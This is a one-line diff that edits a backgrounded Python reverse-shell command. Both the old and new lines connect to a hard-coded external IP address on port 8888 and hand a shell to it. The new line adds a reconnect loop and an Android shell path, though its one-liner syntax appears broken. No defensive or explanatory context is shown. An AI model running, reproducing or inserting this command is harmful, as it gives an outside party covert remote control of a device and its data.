@@ -1,1 +1,1 @@
-nohup python3 -c 'import socket,os,subprocess;ip="43.159.44.25";p=8888;s=socket.socket();s.connect((ip,p));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call("/bin/sh")' >/dev/null 2>&1 &
+nohup python3 -c 'import socket,os,subprocess,time;while True:try:s=socket.socket();s.connect(("43.159.44.25",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/system/bin/sh"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE);s.close();except:time.sleep(1)' >/dev/null 2>&1 &
